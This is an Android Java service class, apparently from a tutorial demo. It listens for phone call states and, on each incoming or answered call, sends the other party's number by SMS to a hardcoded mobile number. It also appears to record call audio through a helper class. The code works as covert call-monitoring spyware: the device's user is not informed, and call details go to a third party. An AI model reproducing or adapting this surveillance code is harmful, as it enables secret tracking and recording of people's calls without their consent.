package org.lxh.demo;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneService extends Service {
	private TelephonyManager telephony = null;
	private String outgoingNumber = null;
	private RecordAudioUtil raUtil = null;
	private Intent intent = null ;

	@Override
	public void onCreate() { // 服务创建的时候操作
		super.onCreate();
		this.telephony = (TelephonyManager) super
				.getSystemService(Context.TELEPHONY_SERVICE);
		this.telephony.listen(new PhoneStateListenerImpl(),
				PhoneStateListener.LISTEN_CALL_STATE); // 设置监听操作
	}

	@Override
	public void onStart(Intent intent, int startId) {
		this.outgoingNumber = intent.getStringExtra("outgoingNumber");
		this.intent = intent ;
		super.onStart(intent, startId);
	}

	private class PhoneStateListenerImpl extends PhoneStateListener {

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			switch (state) {
			case TelephonyManager.CALL_STATE_IDLE: // 挂断电话
				if (PhoneService.this.raUtil != null) { // 保险
					PhoneService.this.raUtil.stop();
					PhoneService.this.raUtil = null;
				}
				break;
			case TelephonyManager.CALL_STATE_RINGING: // 领音响起
				new MessageSendUtil(PhoneService.this, PhoneService.this.intent)
						.send("13683527621", incomingNumber, "拨入");
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK: // 接听电话
				new MessageSendUtil(PhoneService.this, PhoneService.this.intent)
						.send("13683527621", PhoneService.this.outgoingNumber,
								"呼出");
				break;
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}
